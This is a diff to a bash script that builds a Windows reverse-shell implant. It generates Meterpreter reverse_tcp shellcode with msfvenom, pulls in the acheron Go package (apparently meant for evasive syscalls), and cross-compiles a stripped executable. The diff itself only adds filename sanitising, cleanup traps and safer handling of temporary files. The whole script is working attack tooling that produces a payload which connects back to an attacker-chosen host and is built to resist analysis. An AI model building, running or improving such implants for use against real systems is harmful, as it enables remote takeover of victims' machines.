@@ -29,8 +29,14 @@ if [ -z "$LHOST" ] || [ -z "$LPORT" ]; then
     exit 1
 fi
 
+# Normalize output filename (replace problematic chars)
+SANITIZED_LHOST=$(echo "$LHOST" | sed 's/[^a-zA-Z0-9._-]/_/g')
 WORKDIR=$(mktemp -d)
-OUTFILE="acheron_${LHOST}_${LPORT}.exe"
+OUTFILE="acheron_${SANITIZED_LHOST}_${LPORT}.exe"
+
+# Cleanup on exit
+trap 'rm -rf "${WORKDIR:-}"' EXIT INT TERM
+
 cd "$WORKDIR"
 
 log() { [ "$VERBOSE" = true ] && echo -e "\e[1;36m[VERBOSE]\e[0m $*"; }
@@ -39,16 +45,25 @@ err() { echo -e "\e[1;31m[-]\e[0m $*"; }
 
 info "Generating shellcode for $LHOST:$LPORT..."
 log "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f hex EXITFUNC=thread"
-MSF_OUT=$(msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST="$LHOST" LPORT="$LPORT" -f hex EXITFUNC=thread 2>&1)
-MSF_EXIT=$?
-# Filter out msfvenom warning messages - extract ONLY the pure hex line
-SHELLCODE=$(echo "$MSF_OUT" | grep -E '^[0-9a-fA-F]{100,}$' | head -1 | tr -d '\n\r ')
-echo "$SHELLCODE" > sc.hex
-if [ $MSF_EXIT -ne 0 ] || [ -z "$SHELLCODE" ]; then
+
+# Capture msfvenom output safely
+if ! MSF_OUT=$(msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST="$LHOST" LPORT="$LPORT" -f hex EXITFUNC=thread 2>&1); then
+    MSF_EXIT=$?
     err "msfvenom failed (exit $MSF_EXIT)"
     echo "$MSF_OUT"
-    rm -rf "$WORKDIR"; exit 1
+    exit 1
 fi
+
+# Filter out msfvenom warning messages - extract ONLY the pure hex line
+SHELLCODE=$(echo "$MSF_OUT" | grep -E '^[0-9a-fA-F]{100,}$' | head -1 | tr -d '\n\r ')
+
+if [ -z "$SHELLCODE" ]; then
+    err "msfvenom produced no shellcode"
+    echo "$MSF_OUT"
+    exit 1
+fi
+
+echo "$SHELLCODE" > sc.hex
 log "msfvenom OK - Shellcode: $((${#SHELLCODE}/2)) bytes"
 
 HEX=""
@@ -79,33 +94,38 @@ GO_MOD_OUT=$(go mod init tmp 2>&1)
 [ "$VERBOSE" = true ] && echo "$GO_MOD_OUT"
 
 log "Downloading dependencies (timeout 120s)..."
-timeout 120 go get github.com/f1zm0/acheron golang.org/x/sys/windows 2>&1 | tee /tmp/go_get.log
-[ "$VERBOSE" = true ] && cat /tmp/go_get.log | grep -v "go: downloading"
+timeout 120 go get github.com/f1zm0/acheron golang.org/x/sys/windows 2>&1 | tee "$WORKDIR/go_get.log"
+[ "$VERBOSE" = true ] && cat "$WORKDIR/go_get.log" | grep -v "go: downloading"
 
 info "Building GOOS=windows GOARCH=amd64..."
 log "GOOS=windows GOARCH=amd64 go build -v -ldflags=\"-s -w\" -o $OUTFILE main.go"
 log "Target: Windows x64 (amd64)"
 log "Strip flags: -s (symbols) -w (DWARF)"
-# Run build in background with timeout, capture output in real-time
+
+# Build with timeout, capture output
 log "Starting build (timeout 300s)..."
 (
     GOOS=windows GOARCH=amd64 timeout 300 go build -v -ldflags="-s -w" -o "$OUTFILE" main.go 2>&1
-    echo "BUILD_EXIT:$?" > /tmp/build_exit_code
-) | tee /tmp/go_build.log &
+    echo "BUILD_EXIT:$?" > "$WORKDIR/build_exit_code"
+) | tee "$WORKDIR/go_build.log" &
 BUILD_PID=$!
 log "Build started (PID: $BUILD_PID). Waiting..."
 wait $BUILD_PID
-BUILD_EXIT=$(cat /tmp/build_exit_code 2>/dev/null | cut -d: -f2)
-BUILD_OUT=$(cat /tmp/go_build.log 2>/dev/null || echo "timeout or error")
-if [ ${BUILD_EXIT:-0} -eq 0 ]; then
+
+# Default to failure if exit code file missing
+BUILD_EXIT="${BUILD_EXIT:-1}"
+if [ -f "$WORKDIR/build_exit_code" ]; then
+    BUILD_EXIT=$(cat "$WORKDIR/build_exit_code" | cut -d: -f2)
+fi
+BUILD_OUT=$(cat "$WORKDIR/go_build.log" 2>/dev/null || echo "timeout or error")
+
+if [ "${BUILD_EXIT}" -eq 0 ]; then
     cd - >/dev/null
     mv "$WORKDIR/$OUTFILE" "./$OUTFILE"
-    info "Generated: ./$OUTFILE ($(ls -lh ./$OUTFILE | awk '{print \$5}'))"
-    log "Binary: $(file ./$OUTFILE 2>/dev/null || echo 'PE32+ executable')"
-    rm -rf "$WORKDIR"
+    info "Generated: ./$OUTFILE ($(ls -lh "./$OUTFILE" | awk '{print \$5}'))"
+    log "Binary: $(file "./$OUTFILE" 2>/dev/null || echo 'PE32+ executable')"
 else
     err "Build failed (exit $BUILD_EXIT)"
     echo "$BUILD_OUT"
-    rm -rf "$WORKDIR"
     exit 1
 fi
